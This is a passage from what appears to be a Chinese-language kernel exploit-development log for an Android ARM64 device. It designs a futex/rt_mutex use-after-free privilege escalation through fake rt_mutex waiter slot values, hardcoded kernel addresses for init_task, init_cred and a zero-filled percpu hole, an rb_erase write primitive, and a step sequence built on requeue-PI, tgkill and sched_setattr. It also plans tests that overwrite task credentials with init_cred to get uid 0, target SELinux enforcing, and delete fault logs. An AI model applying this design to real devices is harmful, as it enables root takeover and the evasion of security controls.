⚠️ **未验证假设**：`init_task.pi_lock` 在此上下文确实为 0 且 `raw_spin_lock_irqsave` 不会因 `debug_locks` 报警。
本机 `PROVE_LOCKING=n` ⇒ `lockdep_assert_held` 空展开（`lockdep.h:430`），无 lockdep 干扰。
`CONFIG_DEBUG_ATOMIC_SLEEP=n`（`mey_config.txt:7656`）⇒ `BUG_ON(cond)` 类断言不触发。

---

## 7. ★ `[5] trylock` / `[9] unlock` 的真实性质

`rtmutex.c:830-833`：
```c
	if (!raw_spin_trylock(&lock->wait_lock)) {
		raw_spin_unlock_irq(&task->pi_lock);
		cpu_relax();
		goto retry;
	}
```

| 项 | 值 |
|---|---|
| 语义 | 原子 test-and-set 成功即 `*(lock+0x00) : 0 → 1` |
| 位宽 | `raw_spinlock_t` = **4 字节**（`RAW_SPIN_LOCK_UNLOCKED` = 0）；但 ARM64 上 `raw_spin_trylock` 可能用 `ldaxr/stlxr`，实际写 4 字节 |
| 收尾 | `[9]` `raw_spin_unlock_irq(&lock->wait_lock)`（`:963`）写回 0 |
| **净效果** | ★ **净零、无残留** |
| 独立价值 | ★ 作为「任意地址 4 字节写 1」的候选原语（第二发可考虑 `lock->owner@+0x18`，但那会破坏 `[9]` 出口） |

⇒ **`[5]` 本身不是提权原语**（写 1 又写回 0）。它的价值是**持锁保护** `[7]`/`[8]` 这一段，让 `lock+0x08/+0x10` 不被并发改动。

★ 顺带：`lock` 现在放画布内 ⇒ 这一发**连真实内核锁都不碰** ⇒ `[5]`/`[9]` 的全部副作用都关在画布里。

---

## 8. 候选几何评分表（第一发设计）

### 8.1 槽位取值候选

| 槽位 | waiter off | 画布 off | vreg（H175 机器重算） | 第一发取值（verify 模式） | 理由 |
|---|---|---|---|---|---|
| `tree.__rb_parent_color` = **V** | +0x00 | +0x70 | `v7.d[0]` | `0`（或指向画布内的地址） | 走 A3：`V&~3==0` ⇒ 连带写落 `lock+0x08`（画布内） |
| `tree.rb_right` = **T** | +0x08 | +0x78 | `v7.d[1]` | **一个无害可写地址** | 主写落点；必须 `≠ 0` |
| `tree.rb_left` | +0x10 | +0x80 | `v8.d[0]` | `0` | 走 Case 1（`!tmp`） |
| `tree.prio` | +0x18 | +0x88 | `v8.d[1]` | `0` | 与 `task->prio` 不等 ⇒ 不早退 |
| `tree.deadline` | +0x20 | +0x90 | `v9.d[0]` | `0` | — |
| `pi_tree` | +0x28 | +0x98 | `v9.d[1]` | `0` | 画布内 `[9]` 返回前不解引用 |
| **`task`** | +0x50 | +0xc0 | `v12.d[0]` | **`&init_task` = `0xffffffc08217e280`** | ★ `[9]` 硬约束（§6） |
| **`lock` = L | +0x58 | +0xc8 | `v12.d[1]` | **`0xffffffc082136048`** | ★★ **U1 由 H178 解除**（§5.5 否证画布方案） |
| `wake_state` | +0x60 | +0xd0 | `v13.d[0]` | **`0`** | ★ 令 `try_to_wake_up` 命中早退门 #1 |
| `ww_ctx` | +0x68 | +0xd8 | `v13.d[1]` | `0` | `PREEMPT_RT` 未开 ⇒ `:777` 短路不解引用 |

### 8.2 `lock` 四 qword（★ H178 已定：`LOCK = 0xffffffc082136048`）

> ⚠️ 原 §8.2 写的是「`SP0-0x1a0` 起 0x20 字节（画布内）」——**已被 §5.5 自我否证**。
> 正确落点见 H178：`lock` 是一块**常量已知的内核全零区**（`.data..percpu` 空洞，0x38 字节，
> Image 内实测全零、无 kallsyms 符号、同 4K 页无其他符号），**不依赖 `SP0`**。

| off | 字段 | 初值 | 谁会改 | 违反后果 |
|---|---|---|---|---|
| +0x00 | `wait_lock`（**4 字节**） | 0 | `[5]` 写 1 → `[9]` 写回 0 | 非 0 ⇒ `[5]` 无限 `retry`（软挂） |
| +0x08 | `waiters.rb_node` | **0** | `[8] rb_link_node` 写 `&entry` | 非 0 ⇒ `[8]` 进 while 遍历野指针必崩；**A3/B3 连带写也会污染它 ⇒ 禁 A3/B3** |
| +0x10 | `waiters.rb_leftmost` | 0 | `[8] rb_insert_color_cached` 写 `&entry` | 决定 `:917`(读 0) / `:960`(读 `&entry`) ⇒ **`:961` 闸门成立**（§6） |
| +0x18 | `owner` | **0** | 只读 | 非 0 ⇒ `[9]` 不走 owner==0 干净出口；**`:845` `owner==top_task` 可能触发 EDEADLK** |

★ `rt_mutex` 本机 size = **0x20**（`rtmutex.h:23-27` + `# CONFIG_DEBUG_LOCK_ALLOC is not set`），
`lock` 空洞 0x38 字节 ⇒ **余量 0x18 可作 `V`/`T` 落点**（见 §8.3）。

### 8.3 第一发（verify 模式）完整设计（★ 按 H178 更新）

**目标**：零内核语义写，只验「通道通 + 不崩 + `[9] return 0`」。

| 约束 | 冲突 |
|---|---|
| 走 A3（`V∈{0,1,2,3}`）⇒ 连带写落 `lock+0x08` | ★§4.3 铁律：`lock+0x08` 被污染 ⇒ `[8]` 进 while ⇒ 崩 |
| 走 B2（`V&~3≠0`）⇒ 连带写落 `V&~3+0x08` | 令 `V&~3` 指向 **`LOCK` 空洞内部** ⇒ **无害** ✔ |

★★ **H178 解法：`V`/`T` 都取 `LOCK` 空洞内的偏移（不是小整数、不是画布）。**

| 量 | 取值 | 说明 |
|---|---|---|
| `LOCK` | `0xffffffc082136048` | 空洞首地址（0x38 字节） |
| **`V`** | **`LOCK + 0x28`** = `0xffffffc082136070` | `V&~3 = V`（8 字节对齐 ✔）；`V&~3+0x10 = LOCK+0x38`（洞外，但**只被读**） |
| **`T`** | **`LOCK + 0x20`** = `0xffffffc082136068` | 主写 `*(T) = V` ⇒ `*(LOCK+0x20) = LOCK+0x28` |

| 写 | 汇编 | 落点 | 值 | 空洞内？ |
|---|---|---|---|---|
| 主写 `:251` | `str x9,[x10]` | `*(LOCK+0x20)` | `V = LOCK+0x28` | ✔ |
| 连带写 `:253` | `str x10,[x8,#0x08]` | `*(LOCK+0x30)` | `T = LOCK+0x20` | ✔ |

⇒ ★★ **两条写分离到 `LOCK+0x20` 与 `LOCK+0x30`，全在 0x38 空洞内 ⇒ 零真实内核数据触碰。**

★ **H178 §6.3 新增约束（务必遵守）**：`rb_erase_cached`（`rbtree.h:123`）在
`root->rb_leftmost == node` 时会调 `rb_next(node)`。第一次迭代 `[8]` 已把 `lock+0x10`
写成 `&entry` ⇒ **第 2..10 次投递的 `[7]` 必然进 `rb_next`**。
`rb_next`（`rbtree.c:503`）`if (node->rb_right) { while (node->rb_left) ... }`
⇒ ★★ **`rb_right` 必须严格为 0**（现有 `tgkill_staged` 的 `v7.d[1]` 清零已满足）。

★ 判据（**独立透镜，不用同一原语自证**）：
1. `sched_setattr` 返回 **0**（这本身就是 `[9] return 0` 的外部可见后果）；
2. `boot_id` 三重 md5 一致 ⇒ 未 panic；
3. `sig_hits` 计数正确 ⇒ 画布真的落到 W 栈上；
4. `/data/log/reliability/faultdetect/history.log` 无新条目。

### 8.4 执行序列

| 步 | 动作 | 判据 |
|---|---|---|
| S0 | `rm -f` 目标日志文件（★3/★4 纪律） | — |
| S1 | 三重 md5 复核 `boot_id` 未变 | 一致才继续 |
| S2 | W 持 `f_chain`（`LOCK_PI`），等 `g_go` | — |
| S3 | `WAIT_REQUEUE_PI(f_src, f_target)` 带 `abs_time` 超时 ⇒ 栈上留 `rt_waiter` | 返回 `ETIMEDOUT` |
| S4 | `tgkill` 投递画布（`v7={V,T}`、`v8.d[0]=0`、`v8.d[1]=0`、`v12={&init_task, L}`、`v13={0,0}`）+ fake lock 4 qword 清零 | `sig_hits` 计数 |
| S5 | `sched_setattr(self, SCHED_FIFO, pi=true)` | ★ **返回 0** |
| S6 | 复核 `boot_id` | 不变 |

★ **S3 的 `abs_time` 是必须的**（H142 §四 发现 2：`futex_requeue` 死锁分支不唤醒 W，不传 `abs_time` 会永久挂住）。
★ **S5 的 `pi=true` 是必须的**（`sched/core.c:8012-8015`：`if (pi) rt_mutex_adjust_pi(p)`）。

---

## 9. 可证伪判据表

| # | 若此结论成立，则应观测到 | 若观测不到，说明 | 独立透镜？ |
|---|---|---|---|
| J1 | 连带写存在 | 用 `V = 某内核全局地址 A`（A 所在页其余内容为已知模式），观察 A 或 A+8 是否被改成 `T` | ✔ 读回 A |
| J2 | 连带写落点是 `V&~3+0x10` 或 `+0x08`，由 `*(V&~3+0x10)==&entry` 选 | 分别构造两种 `*(V&~3+0x10)`（等于 / 不等于 `&entry`），看落点是否在 `+0x10` / `+0x08` | ✔ |
| J3 | 转置式成立 | `V=task+0x818, T=init_cred` ⇒ 观测 `getuid()` 从 2000 变 0 **且** `id -u` 变 0（若落 `+0x08` 则一发两写） | ✔ uid 是外部可观测量 |
| J4 | `init_cred->uid` 未被连带写破坏 | `adb shell id -u` = 0 **且** init 未软砖（系统不重启、`getenforce` 仍能响应） | ✔ |
| J5 | `[9] wake_up_state` 会触发 | `waiter->task = 0` ⇒ panic（`null_pointer`）；`waiter->task = &init_task` ⇒ 不 panic。**两者对比即独立判定** | ✔★ 这是最强判据：H142 已实测 `null_pointer` |
| J6 | `wake_state = 0` 令其零副作用 | `wake_state = 0` 与 `wake_state = TASK_UNINTERRUPTIBLE` 行为**相同**（都不崩、不 wake 别人） | ✔ |
| J7 | `lock` 可放画布内 | `L = &waiter+0x70` ⇒ `sched_setattr` 返回 0 且 `boot_id` 不变 | ✔ |
| J8 | `lock+0x08` 必须为 0 | 故意在画布里把 `lock+0x08` 写非 0 ⇒ `[8]` 进 while ⇒ 崩或行为异常 | ✔ 差分实验 |
| J9 | `[8]` 会自我撤销零值 | `V=0, T=selinux_state+0x0000` ⇒ `getenforce` **仍为 Enforcing** | ✔★ 这是 C7 的判决性实验 |
| J10 | `requeue` 恒为 true（必走 `[7]`） | 若 `[7]` 未执行，则无写发生 ⇒ 用 J1 的观测反推 | ✔ |

★ **J5 与 J9 是判决性的**：J5 用「同一画布、只改 `waiter->task` 一个槽」做差分，J9 用「同一画布、只改 `T` 一个槽」做差分。**都是真正的独立透镜，不是循环自证。**

---

## 10. 与既有报告的关系（交叉校验）

| 报告 | 本轮判定 |
|---|---|
| **H176 §6.1-§6.2**（写原语两条路径） | ⚠️ **部分作废**：「`rebalance=NULL` 干净退出」成立；**「单写」作废**，漏 `__rb_change_child` |
| **H176 §6.3**（消费侧副作用清单） | ✔ 成立（`root` 是我方给的、`RB_CLEAR_NODE` 写画布、`[9]` 直接返回） |
| **H176 §6.3 红利 1**（空树单插零重平衡） | ✔ **汇编已证**（`rbtree.c:94-102` 的 `if (unlikely(!parent)) { rb_set_parent_color(node, NULL, RB_BLACK); break; }`） |
| **H176 §6.3 红利 2**（`lock+0x18==0` ⇒ `[9]` 命中，trylock 净零） | ✔ 成立 |
| **H176 §6.3 红利 3**（prerequeue ≡ top ⇒ 不 wake） | ✗ **作废**（§6：`[8]` 会改写 `lock+0x10`） |
| **H176 §7**（U1 找内核全零区） | ✗ **作废**（§5：`lock` 可放画布内） |
| **H176 §8**（第一发打 `selinux_state.enforcing`） | ✗ **作废**（§4.2：`[8]` 自我撤销） |
| **H176 §8**（stage8 直接 `task+0x818 = init_cred`） | ✗ **作废**（§3：会写坏 `init_cred->uid` ⇒ 软砖） |
| **H176 §9 U3**（`waiter->task` 填 0 或 task 自身） | ⚠️ **订正**：填 0 会 panic（§6.2）；填 `&init_task` + `wake_state=0` |
| **H176 §9 U4**（`wake_state`/`ww_ctx` 保持 0） | ✔ 成立，且 `wake_state=0` 现在**更重要**（它是早退门） |
| **H175 §3.3 槽位表** | ✔ 全部沿用（本轮未发现偏移错误） |
| **H175 §3.3 注①「V 与必须为 0 的 rb_right 同处 v7」** | ⚠️ **前提错了**：`rb_right` 现在是**写地址 T**（不要求 0）；要求 0 的是 `rb_left`。见 §8.1 |
| **H142 §2 `null_pointer` panic** | ★ **本轮解释了该 panic 的机制**：`waiter->task = 0` ⇒ `wake_up_state(NULL,0)` ⇒ `try_to_wake_up` 首个 `raw_spinlock_irqsave(&p->pi_lock)` 即 NULL 解引用 |
| **H138 §七 E（冻结线）** | ✔ 已解冻（本轮继续推进） |
| **CVE-2026-64560** | ⚠️ **本轮完全未推进**（`posix-cpu-timers` non-leader exec 竞争 UAF，仍是独立面） |

---

## 11. 未决项（下一轮）

| # | 事项 | 为什么必须做 | 状态 |
|---|---|---|---|
| ~~**U1'**~~ | ~~把 fake lock 的 0x20 字节编码进 `h175_staged.c`~~ | — | ✅ **H178 已解除**（`LOCK=0xffffffc082136048` 已在 §8.1/§8.2 填入；改码工作本轮完成） |
| **U12** | `.data..percpu` 原体在运行期确实无人访问 | `percpu.c:3130/:3313` 源码双证（boot 时 memcpy 一次），但**未实测** | ⚠️ **新的头号风险**：若第一发 J4（重复投递）崩溃 ⇒ 立即换落点 |
| **U13** | `LOCK+0x00/+0x08/+0x10/+0x18` 四 qword 镜像内确为全 0 | 已离线验证（`h178_audit.py`，非零字节数 0） | ✅ 已闭合 |
| **U14** | `rtmutex.c:752` `next_lock != waiter->lock` 闸门 | 首轮 `next_lock` 即 `waiter->lock`，恒成立；但**此前从未被记录**，H178 已补 | ✅ 已核对 |
| **U2'** | `v7` 双 lane 编码：`fmov d7, x10` 只能填 `v7.d[0]`，需改成能填满两 lane | 本轮改码时**发现现有代码已不需要**：`v7.d[1]`（`rb_right`）必须为 0，`movi v7.2d,#0` 已正确清零 ⇒ **U2' 降级为 N/A** | ✅ 消解 |
| **U3'** | `waiter->task = &init_task`（`0xffffffc08217e280`）+ `wake_state = 0` 编码 | §6.5 | **阻塞第一发** |
| **U5** | **`task`（当前进程 `task_struct`）的绝对地址** | stage8 转置式需要 `task+0x818`；且需知道 `+0x818` 的**低 3 位**以确定连带写落 `+0x818` 还是 `+0x81c`（§3.4） | **阻塞 stage8** |
| **U7** | `task_struct` 偏移置信度：`init_task` span `0x1e280` vs BTF `size=0x12c0` 不符 | vendor RANDSTRUCT/layout delta；所有偏移以 BTF 为准并标注 | 已记录 |
| **U8** | `init_cred` 是否真在 `.data` 且可写 | `kernel/cred.c:46` `struct cred init_cred = {`（非 const）＋ kallsyms `ffffffc082190790 D`（`D` = 初始数据段，可写）✔ | **已闭合** |
| **U9** | 判决性实验 J9（`selinux_state` 是否真被自我撤销） | 只在第二发做，第一发不碰内核全局 | 待做 |
| **U10** | CVE-2026-64560 | 独立面 | 未推进 |

---

## 12. 本轮实读文件清单

| 文件 | 读了什么 |
|---|---|
| `kernel_src/.../include/linux/rbtree_augmented.h` | `:185-330` 全量（`__rb_change_child` / `__rb_erase_augmented` 三 Case） |
| `kernel_src/.../include/linux/rbtree.h` | `:31-36`（`RB_EMPTY_NODE`/`RB_CLEAR_NODE`）、`:59-66`（`rb_link_node`）、`:108-129`（`rb_insert_color_cached`/`rb_erase_cached`）、`:155-200`（`rb_add_cached`） |
| `kernel_src/.../lib/rbtree.c` | `__rb_insert`（空树首插 `break`）、`rb_first`/`rb_last`/`rb_next` |
| `kernel_src/.../kernel/locking/rtmutex.c` | `:300-470`（`__waiter_prio`/`waiter_update_prio`/`node_less`/`node_equal`/`__waiter_less`/`rt_mutex_enqueue`）、`:455-540`（`dequeue`/`enqueue_pi`/`dequeue_pi`）、`:600-1000`（`adjust_prio_chain` 全体 + `[1]`–`[13]` 逐段） |
| `kernel_src/.../kernel/locking/rtmutex_api.c` | `:440-480`（`rt_mutex_adjust_pi` + 触发点） |
| `kernel_src/.../kernel/locking/rtmutex_common.h` | `:60-140`（`rt_mutex_top_waiter`） |
| `kernel_src/.../kernel/sched/core.c` | `try_to_wake_up`（`:4315-4600`）、`wake_up_state`（`:4604-4607`）、`__task_state_match`（`:2297-2306`）、`ttwu_state_match`（`:4164-4191`） |
| `kernel_src/.../include/linux/lockdep.h` | `:317-334`、`:424-435`（`PROVE_LOCKING=n` ⇒ 空展开） |
| `kernel_src/.../kernel/cred.c` | `:46`（`init_cred` 非 const） |
| `analysis/output/btf_offsets.txt` | `struct cred`（`:220-236`）、`struct selinux_state`（`:252-261`）、`struct rt_mutex_waiter`（`:312-318`）、`task_struct.pi_lock@0x90c`（`:144`）/ `pi_blocked_on@0x938`（`:149`） |
| `analysis/output/mey_6.6.118.kallsyms.txt` | `rb_erase=0xffffffc08003a9d4`、`wake_up_state=0xffffffc08004f0c4`、`try_to_wake_up=0xffffffc08016736c`、`init_task=0xffffffc08217e280`、`init_cred=0xffffffc082190790`、`__start_init_task=0xffffffc082160000` |
| `analysis/output/mey_config.txt` | `:252 CONFIG_BUG=y`、`:7648 PROVE_LOCKING=n`、`:7650 DEBUG_RT_MUTEXES=n`、`:7656 DEBUG_ATOMIC_SLEEP=n`、`:7594 KASAN=y`、`:750-751 CFI_CLANG=y + CFI_PERMISSIVE=n`、`:7615-7616 PANIC_ON_OOPS=y/1` |
| **反汇编（本轮新做）** | `rb_erase@0xffffffc08003a9d4` Case 1 全 12 条 + Case 1' 9 条；`wake_up_state@0xffffffc08004f0c4` 全 9 条 |
| `analysis/output/h175_staged_canvas.md` | 全文（画布几何 + 槽位表 + `rb_node` 字段顺序三重验证） |
| `analysis/output/h176_consumer_side_primitive.md` | §0、§3、§4、§6、§7、§8、§9 全文 |
| `analysis/output/h142_cve43499_uaf_hit.md` | 全文（`null_pointer` panic 实证） |
| `analysis/output/h138_ptregs_readside.md` | 全文（SROP/pt_regs 线已双向闭合判死；冻结线已解冻） |